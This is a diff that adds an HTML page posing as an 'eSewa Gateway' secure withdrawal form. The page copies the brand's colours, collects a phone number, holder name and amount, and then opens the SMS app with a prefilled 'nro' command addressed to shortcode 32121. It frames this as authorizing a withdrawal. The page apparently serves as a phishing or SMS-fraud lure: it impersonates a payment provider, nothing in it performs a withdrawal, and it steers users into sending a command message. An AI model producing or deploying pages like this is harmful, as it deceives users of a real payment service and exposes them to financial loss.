@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Withdrawal | eSewa Gateway</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #60bb46; /* eSewa Green */
+            --primary-hover: #4e9a39;
+            --bg-color: #f4f7f6;
+            --card-bg: #ffffff;
+            --text-main: #1a1a1b;
+            --text-muted: #65676b;
+            --error: #dc3545;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background: var(--card-bg);
+            width: 100%;
+            max-width: 450px;
+            padding: 40px;
+            border-radius: 24px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            color: var(--text-main);
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-main);
+            margin-bottom: 8px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e1e1e1;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 4px rgba(96, 187, 70, 0.1);
+        }
+
+        .btn-verify {
+            width: 100%;
+            padding: 16px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .btn-verify:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: var(--text-muted);
+            line-height: 1.5;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px;
+                border-radius: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <h1>Withdrawal Process</h1>
+            <p>Please enter your eSewa details accurately</p>
+        </div>
+
+        <div class="form-group">
+            <label for="phone">eSewa Holder Number</label>
+            <input type="tel" id="phone" placeholder="98XXXXXXXX" maxlength="10">
+        </div>
+
+        <div class="form-group">
+            <label for="name">eSewa Holder Name</label>
+            <input type="text" id="name" placeholder="Full Name">
+        </div>
+
+        <div class="form-group">
+            <label for="amount">Withdrawal Amount</label>
+            <input type="number" id="amount" placeholder="Min. Rs. 100">
+        </div>
+
+        <button class="btn-verify" onclick="handleWithdrawal()">Verify your eSewa</button>
+
+        <div class="footer-note">
+            By clicking verify, your SMS app will open to authorize the request via 32121.
+        </div>
+    </div>
+
+    <script>
+        function handleWithdrawal() {
+            // Get input values
+            const phone = document.getElementById('phone').value;
+            const name = document.getElementById('name').value;
+            const amount = document.getElementById('amount').value;
+
+            // Simple Validation
+            if (!phone || !name || !amount) {
+                alert("Please fill in all fields to proceed.");
+                return;
+            }
+
+            // Define SMS details
+            const recipient = "32121";
+            const message = `nro ${phone} ${name} ${amount}`;
+            
+            // Generate SMS URI
+            // Format: sms:number?body=message (works for iOS and Android)
+            const smsUri = `sms:${recipient}?body=${encodeURIComponent(message)}`;
+
+            // Redirect to SMS app
+            window.location.href = smsUri;
+        }
+    </script>
+
+</body>
+</html>
